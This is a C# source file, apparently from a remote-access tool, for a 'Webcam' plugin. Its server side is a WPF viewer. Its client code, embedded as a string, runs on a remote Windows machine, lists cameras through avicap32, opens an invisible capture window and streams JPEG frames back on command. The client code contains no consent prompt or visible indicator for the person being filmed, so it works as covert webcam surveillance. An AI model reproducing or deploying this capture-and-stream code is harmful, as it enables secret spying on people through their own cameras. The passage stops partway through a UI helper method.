// File: Plugins/Builtin/WebcamPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class WebcamPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, WebcamUI> _clientUIs = new();

        public string PluginId => "webcam";
        public string DisplayName => "Webcam";
        public string Version => "1.0.0";
        public string Description => "Remote webcam viewer.";

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ClientPlugin_webcam
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts;
        private volatile bool _playing;
        private int _quality = 70;
        private int _selectedDevice = 0;
        private int _targetFps = 30;

        [DllImport(""avicap32.dll"", EntryPoint=""capCreateCaptureWindowW"", CharSet=CharSet.Unicode)]
        static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);

        [DllImport(""user32.dll"", CharSet=CharSet.Auto)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport(""user32.dll"")]
        static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport(""avicap32.dll"", EntryPoint=""capGetDriverDescriptionW"", CharSet=CharSet.Unicode)]
        static extern bool capGetDriverDescription(int wDriverIndex, StringBuilder lpszName, int cbName, StringBuilder lpszVer, int cbVer);

        const uint WM_CAP_START = 0x0400;
        const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        const uint WM_CAP_SET_PREVIEW = WM_CAP_START + 50;
        const uint WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 52;
        const uint WM_CAP_GET_VIDEOFORMAT = WM_CAP_START + 44;
        const uint WM_CAP_SET_VIDEOFORMAT = WM_CAP_START + 45;
        const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
        const uint WM_CAP_GRAB_FRAME_NOSTOP = WM_CAP_START + 61;
        const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        const uint WM_CAP_SET_CALLBACK_FRAME = WM_CAP_START + 5;
        const uint WM_CAP_SET_SCALE = WM_CAP_START + 53;
        const uint WM_CAP_SEQUENCE_NOFILE = WM_CAP_START + 63;
        const uint WM_CAP_SET_CALLBACK_VIDEOSTREAM = WM_CAP_START + 6;
        const uint WM_CAP_SET_SEQUENCE_SETUP = WM_CAP_START + 64;
        const uint WM_CAP_GET_SEQUENCE_SETUP = WM_CAP_START + 65;

        delegate void FrameCallbackDelegate(IntPtr hWnd, ref VIDEOHDR lpVHdr);

        [StructLayout(LayoutKind.Sequential)]
        struct VIDEOHDR
        {
            public IntPtr lpData;
            public int dwBufferLength;
            public int dwBytesUsed;
            public int dwTimeCaptured;
            public int dwUser;
            public int dwFlags;
            public IntPtr dwReserved0;
            public IntPtr dwReserved1;
            public IntPtr dwReserved2;
            public IntPtr dwReserved3;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFOHEADER
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int pt_x;
            public int pt_y;
        }

        [DllImport(""user32.dll"")]
        static extern bool PeekMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);
        [DllImport(""user32.dll"")]
        static extern bool TranslateMessage(ref MSG lpMsg);
        [DllImport(""user32.dll"")]
        static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport(""user32.dll"")]
        static extern bool OpenClipboard(IntPtr hWndNewOwner);
        [DllImport(""user32.dll"")]
        static extern bool CloseClipboard();
        [DllImport(""user32.dll"")]
        static extern IntPtr GetClipboardData(uint uFormat);
        [DllImport(""user32.dll"")]
        static extern bool EmptyClipboard();
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GlobalLock(IntPtr hMem);
        [DllImport(""kernel32.dll"")]
        static extern bool GlobalUnlock(IntPtr hMem);
        [DllImport(""kernel32.dll"")]
        static extern int GlobalSize(IntPtr hMem);

        const uint CF_DIB = 8;

        private IntPtr _capHwnd = IntPtr.Zero;
        private List<string> _deviceNames = new List<string>();
        private Thread _captureThread;
        private FrameCallbackDelegate _frameCallback;
        private GCHandle _callbackHandle;
        private BITMAPINFOHEADER _currentFormat;
        private bool _formatKnown;

        private byte[] _pendingFrame;
        private readonly object _frameLock = new object();
        private Thread _sendThread;

        private ImageCodecInfo _jpegCodec;
        private EncoderParameters _encParams;

        private volatile bool _gotCallbackFrame;
        private volatile bool _useCallbackMode;

        Task LogA(string msg)
        {
            try
            {
                byte[] b = Encoding.UTF8.GetBytes(msg);
                byte[] m = new byte[b.Length + 1];
                m[0] = 0xFD;
                Buffer.BlockCopy(b, 0, m, 1, b.Length);
                return _send(m);
            }
            catch { return Task.CompletedTask; }
        }

        Task SendAck(byte cmd, string msg)
        {
            byte[] mb = Encoding.UTF8.GetBytes(msg);
            byte[] m = new byte[mb.Length + 2];
            m[0] = 0xFE; m[1] = cmd;
            Buffer.BlockCopy(mb, 0, m, 2, mb.Length);
            return _send(m);
        }

        Task SendErr(byte cmd, string msg)
        {
            byte[] mb = Encoding.UTF8.GetBytes(msg);
            byte[] m = new byte[mb.Length + 2];
            m[0] = 0xFF; m[1] = cmd;
            Buffer.BlockCopy(mb, 0, m, 2, mb.Length);
            return _send(m);
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            _cts = new CancellationTokenSource();

            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == ""image/jpeg"")
                {
                    _jpegCodec = codec;
                    break;
                }
            }
            UpdateEncoderParams();

            Exception initEx = null;
            try
            {
                EnumerateDevices();
                await LogA(""[INIT] Devices="" + _deviceNames.Count);
                await SendDeviceList();
            }
            catch (Exception ex) { initEx = ex; }
            if (initEx != null)
                await LogA(""[INIT] ERROR: "" + initEx.Message);

            try
            {
                while (!_cts.IsCancellationRequested)
                {
                    byte[] data = null;
                    bool fail = false;
                    try { data = await receiveData(); } catch { fail = true; }
                    if (fail || data == null || data.Length == 0) break;

                    Exception cmdEx = null;
                    try { await HandleCmd(data); }
                    catch (Exception ex) { cmdEx = ex; }
                    if (cmdEx != null)
                        await LogA(""[ERR] "" + cmdEx.Message);
                }
            }
            catch { }
            finally { StopCapture(); }
        }

        void UpdateEncoderParams()
        {
            _encParams = new EncoderParameters(1);
            _encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)_quality);
        }

        void EnumerateDevices()
        {
            _deviceNames.Clear();
            for (int i = 0; i < 10; i++)
            {
                var name = new StringBuilder(256);
                var ver = new StringBuilder(256);
                if (capGetDriverDescription(i, name, 256, ver, 256))
                    _deviceNames.Add(name.ToString().Trim());
                else break;
            }
        }

        async Task HandleCmd(byte[] data)
        {
            byte cmd = data[0];
            switch (cmd)
            {
                case 0x01:
                    EnumerateDevices();
                    await SendDeviceList();
                    break;
                case 0x02:
                    if (data.Length >= 2)
                    {
                        int index = data[1];
                        if (index >= 0 && index < _deviceNames.Count)
                        {
                            _selectedDevice = index;
                            await SendAck(0x02, ""Selected: "" + _deviceNames[index]);
                        }
                    }
                    break;
                case 0x03:
                    StopCapture();
                    if (_deviceNames.Count == 0)
                    {
                        await SendErr(0x03, ""No webcam device found"");
                        return;
                    }
                    _playing = true;
                    StartCapture();
                    await SendAck(0x03, ""Capture started"");
                    break;
                case 0x04:
                    StopCapture();
                    await SendAck(0x04, ""Capture stopped"");
                    break;
                case 0x05:
                    if (data.Length >= 2)
                    {
                        _quality = data[1];
                        if (_quality < 1) _quality = 1;
                        if (_quality > 100) _quality = 100;
                        UpdateEncoderParams();
                        await SendAck(0x05, ""Quality="" + _quality);
                    }
                    break;
            }
        }

        void StartCapture()
        {
            _captureThread = new Thread(CaptureLoop);
            _captureThread.SetApartmentState(ApartmentState.STA);
            _captureThread.IsBackground = true;
            _captureThread.Start();

            _sendThread = new Thread(SendLoop);
            _sendThread.IsBackground = true;
            _sendThread.Start();
        }

        void SendLoop()
        {
            while (_playing && !_cts.IsCancellationRequested)
            {
                byte[] frame = null;
                lock (_frameLock)
                {
                    frame = _pendingFrame;
                    _pendingFrame = null;
                }

                if (frame != null)
                {
                    try { _send(frame).Wait(3000); }
                    catch { }
                }
                else
                {
                    Thread.Sleep(1);
                }
            }
        }

        void CaptureLoop()
        {
            IntPtr hwnd = IntPtr.Zero;
            try
            {
                hwnd = capCreateCaptureWindow(""cap"", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hwnd == IntPtr.Zero)
                {
                    LogA(""[ERR] Failed to create capture window"").Wait(1000);
                    return;
                }
                _capHwnd = hwnd;

                IntPtr result = SendMessage(hwnd, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedDevice, IntPtr.Zero);
                if (result == IntPtr.Zero)
                {
                    LogA(""[ERR] Failed to connect to webcam device "" + _selectedDevice).Wait(1000);
                    DestroyWindow(hwnd);
                    _capHwnd = IntPtr.Zero;
                    return;
                }

                LogA(""[INFO] Connected to device "" + _selectedDevice).Wait(1000);

                _formatKnown = false;
                int formatSize = (int)SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, IntPtr.Zero, IntPtr.Zero);
                if (formatSize >= Marshal.SizeOf(typeof(BITMAPINFOHEADER)))
                {
                    IntPtr fmtBuf = Marshal.AllocHGlobal(formatSize);
                    try
                    {
                        SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, (IntPtr)formatSize, fmtBuf);
                        _currentFormat = (BITMAPINFOHEADER)Marshal.PtrToStructure(fmtBuf, typeof(BITMAPINFOHEADER));
                        _formatKnown = true;
                        LogA(""[INFO] Format: "" + _currentFormat.biWidth + ""x"" + Math.Abs(_currentFormat.biHeight) + "" bpp="" + _currentFormat.biBitCount).Wait(1000);
                    }
                    finally { Marshal.FreeHGlobal(fmtBuf); }
                }

                // Try callback mode first
                _gotCallbackFrame = false;
                _useCallbackMode = true;
                _frameCallback = new FrameCallbackDelegate(OnFrame);
                _callbackHandle = GCHandle.Alloc(_frameCallback);
                IntPtr callbackPtr = Marshal.GetFunctionPointerForDelegate(_frameCallback);
                SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, callbackPtr);
                SendMessage(hwnd, WM_CAP_SET_PREVIEWRATE, (IntPtr)33, IntPtr.Zero);
                SendMessage(hwnd, WM_CAP_SET_PREVIEW, (IntPtr)1, IntPtr.Zero);

                // Pump messages for up to 2 seconds to see if callback fires
                DateTime testStart = DateTime.UtcNow;
                while (_playing && !_cts.IsCancellationRequested && (DateTime.UtcNow - testStart).TotalMilliseconds < 2000)
                {
                    PumpMessages();
                    if (_gotCallbackFrame) break;
                    Thread.Sleep(10);
                }

                if (_gotCallbackFrame)
                {
                    LogA(""[INFO] Using callback mode"").Wait(1000);
                    // Continue with callback mode - just pump messages
                    while (_playing && !_cts.IsCancellationRequested)
                    {
                        PumpMessages();
                        Thread.Sleep(1);
                    }
                }
                else
                {
                    // Callback didn't fire - switch to grab mode
                    _useCallbackMode = false;
                    SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, IntPtr.Zero);
                    SendMessage(hwnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero);
                    LogA(""[INFO] Callback mode failed, switching to grab mode"").Wait(1000);

                    int frameDelay = 1000 / _targetFps;
                    while (_playing && !_cts.IsCancellationRequested)
                    {
                        DateTime frameStart = DateTime.UtcNow;

                        try
                        {
                            GrabAndEncodeFrame(hwnd);
                        }
                        catch { }

                        PumpMessages();

                        int elapsed = (int)(DateTime.UtcNow - frameStart).TotalMilliseconds;
                        int sleepTime = frameDelay - elapsed;
                        if (sleepTime > 0) Thread.Sleep(sleepTime);
                        else Thread.Sleep(1);
                    }
                }
            }
            catch (Exception ex)
            {
                try { LogA(""[ERR] CaptureLoop: "" + ex.Message).Wait(1000); } catch { }
            }
            finally
            {
                if (hwnd != IntPtr.Zero)
                {
                    try { SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { SendMessage(hwnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { SendMessage(hwnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch { }
                    try { DestroyWindow(hwnd); } catch { }
                    _capHwnd = IntPtr.Zero;
                }
                if (_callbackHandle.IsAllocated) _callbackHandle.Free();
            }
        }

        void PumpMessages()
        {
            MSG msg;
            while (PeekMessage(out msg, IntPtr.Zero, 0, 0, 1))
            {
                TranslateMessage(ref msg);
                DispatchMessage(ref msg);
            }
        }

        void GrabAndEncodeFrame(IntPtr hwnd)
        {
            IntPtr grabResult = SendMessage(hwnd, WM_CAP_GRAB_FRAME_NOSTOP, IntPtr.Zero, IntPtr.Zero);
            if (grabResult == IntPtr.Zero)
            {
                grabResult = SendMessage(hwnd, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                if (grabResult == IntPtr.Zero) return;
            }

            // Use clipboard to get the frame
            SendMessage(hwnd, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);

            if (!OpenClipboard(IntPtr.Zero)) return;
            try
            {
                IntPtr hDib = GetClipboardData(CF_DIB);
                if (hDib == IntPtr.Zero) return;

                IntPtr dibPtr = GlobalLock(hDib);
                if (dibPtr == IntPtr.Zero) return;
                try
                {
                    int dibSize = GlobalSize(hDib);
                    if (dibSize < Marshal.SizeOf(typeof(BITMAPINFOHEADER))) return;

                    BITMAPINFOHEADER bih = (BITMAPINFOHEADER)Marshal.PtrToStructure(dibPtr, typeof(BITMAPINFOHEADER));
                    int w = bih.biWidth;
                    int h = Math.Abs(bih.biHeight);
                    int bpp = bih.biBitCount;
                    if (w <= 0 || h <= 0 || bpp <= 0) return;

                    PixelFormat pf;
                    switch (bpp)
                    {
                        case 24: pf = PixelFormat.Format24bppRgb; break;
                        case 32: pf = PixelFormat.Format32bppRgb; break;
                        case 16: pf = PixelFormat.Format16bppRgb565; break;
                        default: return;
                    }

                    int headerSize = bih.biSize;
                    int colorsUsed = bih.biClrUsed;
                    if (colorsUsed == 0 && bpp <= 8)
                        colorsUsed = 1 << bpp;
                    int paletteSize = colorsUsed * 4;
                    int pixelOffset = headerSize + paletteSize;

                    int stride = ((w * bpp + 31) / 32) * 4;
                    int pixelDataSize = stride * h;

                    if (pixelOffset + pixelDataSize > dibSize) return;

                    IntPtr pixelPtr = IntPtr.Add(dibPtr, pixelOffset);

                    byte[] rawPixels = new byte[pixelDataSize];
                    Marshal.Copy(pixelPtr, rawPixels, 0, pixelDataSize);

                    EncodeAndQueue(rawPixels, w, h, bpp, stride, bih.biHeight > 0, pf);
                }
                finally
                {
                    GlobalUnlock(hDib);
                }
            }
            finally
            {
                EmptyClipboard();
                CloseClipboard();
            }
        }

        void EncodeAndQueue(byte[] rawPixels, int w, int h, int bpp, int stride, bool bottomUp, PixelFormat pf)
        {
            using (var bmp = new Bitmap(w, h, pf))
            {
                var bmpData = bmp.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.WriteOnly, pf);
                try
                {
                    int srcStride = stride;
                    int dstStride = bmpData.Stride;

                    if (bottomUp)
                    {
                        int rowBytes = Math.Min(srcStride, Math.Abs(dstStride));
                        for (int y = 0; y < h; y++)
                        {
                            int srcOffset = (h - 1 - y) * srcStride;
                            if (srcOffset + rowBytes > rawPixels.Length) break;
                            IntPtr dstRow = IntPtr.Add(bmpData.Scan0, y * dstStride);
                            Marshal.Copy(rawPixels, srcOffset, dstRow, rowBytes);
                        }
                    }
                    else
                    {
                        int rowBytes = Math.Min(srcStride, Math.Abs(dstStride));
                        for (int y = 0; y < h; y++)
                        {
                            int srcOffset = y * srcStride;
                            if (srcOffset + rowBytes > rawPixels.Length) break;
                            IntPtr dstRow = IntPtr.Add(bmpData.Scan0, y * dstStride);
                            Marshal.Copy(rawPixels, srcOffset, dstRow, rowBytes);
                        }
                    }
                }
                finally
                {
                    bmp.UnlockBits(bmpData);
                }

                byte[] jpegBytes;
                using (var ms = new MemoryStream())
                {
                    if (_jpegCodec != null)
                        bmp.Save(ms, _jpegCodec, _encParams);
                    else
                        bmp.Save(ms, ImageFormat.Jpeg);
                    jpegBytes = ms.ToArray();
                }

                byte[] msg = new byte[9 + jpegBytes.Length];
                msg[0] = 0x30;
                msg[1] = (byte)(w & 0xFF);
                msg[2] = (byte)((w >> 8) & 0xFF);
                msg[3] = (byte)(h & 0xFF);
                msg[4] = (byte)((h >> 8) & 0xFF);
                int jl = jpegBytes.Length;
                msg[5] = (byte)(jl & 0xFF);
                msg[6] = (byte)((jl >> 8) & 0xFF);
                msg[7] = (byte)((jl >> 16) & 0xFF);
                msg[8] = (byte)((jl >> 24) & 0xFF);
                Buffer.BlockCopy(jpegBytes, 0, msg, 9, jpegBytes.Length);

                lock (_frameLock)
                {
                    _pendingFrame = msg;
                }
            }
        }

        void OnFrame(IntPtr hWnd, ref VIDEOHDR hdr)
        {
            if (!_playing || hdr.lpData == IntPtr.Zero || hdr.dwBytesUsed <= 0) return;
            _gotCallbackFrame = true;
            if (!_useCallbackMode) return;

            try
            {
                if (!_formatKnown) return;

                int w = _currentFormat.biWidth;
                int h = Math.Abs(_currentFormat.biHeight);
                int bpp = _currentFormat.biBitCount;
                if (w <= 0 || h <= 0 || bpp <= 0) return;

                PixelFormat pf;
                switch (bpp)
                {
                    case 24: pf = PixelFormat.Format24bppRgb; break;
                    case 32: pf = PixelFormat.Format32bppRgb; break;
                    case 16: pf = PixelFormat.Format16bppRgb565; break;
                    default: return;
                }

                int stride = ((w * bpp + 31) / 32) * 4;
                int dataSize = stride * h;

                byte[] rawPixels = new byte[dataSize];
                int copyLen = Math.Min(dataSize, hdr.dwBytesUsed);
                Marshal.Copy(hdr.lpData, rawPixels, 0, copyLen);

                EncodeAndQueue(rawPixels, w, h, bpp, stride, _currentFormat.biHeight > 0, pf);
            }
            catch { }
        }

        void StopCapture()
        {
            _playing = false;
            if (_captureThread != null)
            {
                try { _captureThread.Join(3000); } catch { }
                _captureThread = null;
            }
            if (_sendThread != null)
            {
                try { _sendThread.Join(3000); } catch { }
                _sendThread = null;
            }
        }

        async Task SendDeviceList()
        {
            var sb = new StringBuilder();
            for (int i = 0; i < _deviceNames.Count; i++)
            {
                if (i > 0) sb.Append(""\n"");
                sb.Append(i).Append(""|"").Append(_deviceNames[i]);
            }
            byte[] ib = Encoding.UTF8.GetBytes(sb.ToString());
            byte[] msg = new byte[ib.Length + 1];
            msg[0] = 0x06;
            Buffer.BlockCopy(ib, 0, msg, 1, ib.Length);
            await _send(msg);
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            bool isActive = _host.IsPluginActive(context.ClientId, PluginId);
            if (!isActive)
            {
                _ = Task.Run(async () =>
                {
                    try { await _host.StartPluginForClient(context.ClientId, PluginId); }
                    catch { }
                });
            }
            var ui = new WebcamUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
                ui.HandleServerData(data);
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (_clientUIs.TryRemove(clientId, out var ui)) ui.Dispose();
            return Task.CompletedTask;
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values) ui.Dispose();
            _clientUIs.Clear();
        }
    }

    [SupportedOSPlatform("windows")]
    public class WebcamUI : UserControl, IDisposable
    {
        private static Color C(string key) => (Color)Application.Current.Resources[key];
        private static SolidColorBrush B(string key) => (SolidColorBrush)Application.Current.Resources[key];

        private Color BgCol => C("BackgroundColor");
        private Color SurfCol => C("SurfaceColor");
        private Color SurfLCol => C("SurfaceLightColor");
        private Color BrdCol => C("BorderColor");
        private Color TxtCol => C("TextPrimaryColor");
        private Color DimCol => C("TextSecondaryColor");
        private Color OkCol => C("SuccessColor");
        private Color OkHov => C("SuccessHoverColor");
        private Color DanCol => C("DangerColor");
        private Color DanHov => C("DangerHoverColor");
        private Color DisCol => C("ButtonBgColor");
        private Color ButtonBorderClr => C("ButtonBorderColor");
        private Color ButtonBgClr => C("ButtonBgColor");
        private Color ButtonBgHoverClr => C("ButtonBgHoverColor");

        private SolidColorBrush BgB => B("BackgroundBrush");
        private SolidColorBrush SfB => B("SurfaceBrush");
        private SolidColorBrush TxB => B("TextPrimaryBrush");
        private SolidColorBrush DmB => B("TextSecondaryBrush");
        private SolidColorBrush GnB => B("SuccessBrush");
        private SolidColorBrush BdB => B("BorderBrush");
        private SolidColorBrush DsB => B("ButtonBgBrush");

        private PluginContext _context;
        private PluginHost _host;
        private WebcamPlugin _plugin;

        private readonly Image _img;
        private readonly TextBlock _status;
        private readonly TextBlock _fpsLbl;
        private readonly TextBlock _bpsLbl;
        private readonly ComboBox _devSel;
        private readonly Slider _qSlider;
        private readonly TextBlock _qLbl;
        private readonly Button _startBtn;
        private readonly Button _stopBtn;
        private readonly TextBox _logBox;
        private readonly Border _logBrd;
        private readonly CheckBox _logToggle;

        private bool _streaming;
        private int _rw = 640, _rh = 480;
        private int _fc;
        private DateTime _lastFps = DateTime.UtcNow;
        private int _fpc;
        private long _bpc;
        private readonly List<(int index, string name)> _devices = new();
        private bool _disposed;
        private bool _suppress;
        private int _logLines;

        private volatile BitmapImage _pendingBitmap;
        private volatile int _pendingW, _pendingH;
        private int _pendingBytesAccum;
        private int _pendingFrameCount;
        private bool _renderScheduled;

        public WebcamUI(PluginContext ctx, PluginHost host, WebcamPlugin plugin)
        {
            _context = ctx; _host = host; _plugin = plugin;

            var g = new Grid();
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = new GridLength(1, GridUnitType.Star) });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });
            g.RowDefinitions.Add(new RowDefinition { Height = GridLength.Auto });

            var tb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 3, 4, 3) };
            var tw = new StackPanel { Orientation = Orientation.Horizontal };
            _startBtn = Btn("Start", OkCol, OkHov, null); _startBtn.Click += StartBtn_Click;
            _stopBtn = Btn("Stop", DanCol, DanHov, null); _stopBtn.IsEnabled = false; _stopBtn.Click += StopBtn_Click;
            var refBtn = Btn("Refresh", ButtonBgClr, ButtonBgHoverClr); refBtn.Click += RefreshBtn_Click;
            var svb = Btn("Save", ButtonBgClr, ButtonBgHoverClr); svb.Click += (s, e) => DoSave();
            tw.Children.Add(_startBtn); tw.Children.Add(_stopBtn); tw.Children.Add(Sep());
            tw.Children.Add(refBtn); tw.Children.Add(svb); tw.Children.Add(Sep());
            _logToggle = new CheckBox
            {
                Content = "Log",
                Foreground = DmB,
                FontSize = 12,
                VerticalAlignment = VerticalAlignment.Center,
                Margin = new Thickness(8, 2, 4, 2)
            };
            _logToggle.Checked += (s, e) => _logBrd.Visibility = Visibility.Visible;
            _logToggle.Unchecked += (s, e) => _logBrd.Visibility = Visibility.Collapsed;
            tw.Children.Add(_logToggle);
            var clrBtn = Btn("Clear", ButtonBgClr, ButtonBgHoverClr); clrBtn.Click += (s, e) => { _logBox.Text = ""; _logLines = 0; };
            tw.Children.Add(clrBtn);
            tb.Child = tw; Grid.SetRow(tb, 0); g.Children.Add(tb);

            var settBar = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 0, 0, 1), Padding = new Thickness(4, 2, 4, 2) };
            var settWrap = new WrapPanel();
            settWrap.Children.Add(Lbl("Device:"));

            _devSel = new ComboBox
            {
                Width = 260,
                Margin = new Thickness(4, 2, 8, 2),
                Background = BgB,
                Foreground = TxB,
                BorderBrush = BdB,
                FontSize = 12,
                Style = null
            };
            ApplyComboTheme(_devSel);
            settWrap.Children.Add(_devSel);
            settWrap.Children.Add(Lbl("Quality:"));
            _qSlider = new Slider { Width = 80, Minimum = 10, Maximum = 100, Value = 70, TickFrequency = 5, IsSnapToTickEnabled = true, Margin = new Thickness(4, 2, 4, 2), VerticalAlignment = VerticalAlignment.Center };
            _qSlider.ValueChanged += QSlider_ValueChanged;
            settWrap.Children.Add(_qSlider);
            _qLbl = Lbl("70%"); settWrap.Children.Add(_qLbl);
            _fpsLbl = new TextBlock { Text = "0 fps", Foreground = GnB, FontSize = 12, FontWeight = FontWeights.SemiBold, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(12, 2, 4, 2) };
            settWrap.Children.Add(_fpsLbl);
            _bpsLbl = new TextBlock { Text = "", Foreground = DmB, FontSize = 11, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 2, 4, 2) };
            settWrap.Children.Add(_bpsLbl);
            settBar.Child = settWrap; Grid.SetRow(settBar, 1); g.Children.Add(settBar);

            var ib = new Border { Background = BgB, ClipToBounds = true };
            _img = new Image { Stretch = Stretch.Fill };
            RenderOptions.SetBitmapScalingMode(_img, BitmapScalingMode.LowQuality);
            ib.Child = _img; Grid.SetRow(ib, 2); g.Children.Add(ib);

            _logBrd = new Border { Background = new SolidColorBrush(BgCol), BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Height = 140, Visibility = Visibility.Collapsed };
            _logBox = new TextBox { Background = new SolidColorBrush(BgCol), Foreground = new SolidColorBrush(OkCol), BorderThickness = new Thickness(0), FontFamily = new FontFamily("Consolas"), FontSize = 11, IsReadOnly = true, TextWrapping = TextWrapping.Wrap, VerticalScrollBarVisibility = ScrollBarVisibility.Auto, Padding = new Thickness(4), CaretBrush = Brushes.Transparent, AcceptsReturn = true, Style = null };
            _logBrd.Child = _logBox; Grid.SetRow(_logBrd, 3); g.Children.Add(_logBrd);

            var stb = new Border { Background = SfB, BorderBrush = BdB, BorderThickness = new Thickness(0, 1, 0, 0), Padding = new Thickness(10, 5, 10, 5) };
            _status = new TextBlock { Text = "Ready", Foreground = DmB, FontSize = 12 };
            stb.Child = _status; Grid.SetRow(stb, 4); g.Children.Add(stb);

            Content = g; Background = BgB; MinWidth = 640; MinHeight = 440;
        }

        private void StartBtn_Click(object sender, RoutedEventArgs e) => DoStart();
        private void StopBtn_Click(object sender, RoutedEventArgs e) => DoStop();
        private void RefreshBtn_Click(object sender, RoutedEventArgs e) => DoRefresh();

        private void QSlider_ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
        {
            if (_qLbl == null) return;
            _qLbl.Text = ((int)_qSlider.Value).ToString() + "%";
            if (_streaming) SendQuality();
        }

        void Log(string m)
        {
            if (_disposed) return;
            var l = "[" + DateTime.Now.ToString("HH:mm:ss.fff") + "] " + m + "\n";
            if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => LogI(l)); else LogI(l);
        }

        void LogI(string l)
        {
            if (_disposed) return;
            _logBox.AppendText(l); _logLines++;
            if (_logLines > 300)
            {
                var t = _logBox.Text;
                int c = 0;
                for (int i = 0; i < 50 && c < t.Length; i++)
                {
                    int n = t.IndexOf('\n', c);
                    if (n < 0) break;
                    c = n + 1;
                }
                if (c > 0) { _logBox.Text = t.Substring(c); _logLines -= 50; }
            }
            _logBox.ScrollToEnd();
        }

        Button Btn(string t, Color bg, Color hv, SolidColorBrush fg = null)
        {
            var nb = new SolidColorBrush(bg); var hb = new SolidColorBrush(hv);
            var bb = new SolidColorBrush(C("ButtonBorderColor")); var db = new SolidColorBrush(C("ButtonBgColor"));
            var tp = new ControlTemplate(typeof(Button));
            var bd = new FrameworkElementFactory(typeof(Border), "bd");
            bd.SetValue(Border.BackgroundProperty, nb); bd.SetValue(Border.BorderBrushProperty, bb);
            bd.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            bd.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            bd.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            bd.SetValue(Border.SnapsToDevicePixelsProperty, true);
            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            bd.AppendChild(cp); tp.VisualTree = bd;
            var h = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true }; h.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); tp.Triggers.Add(h);
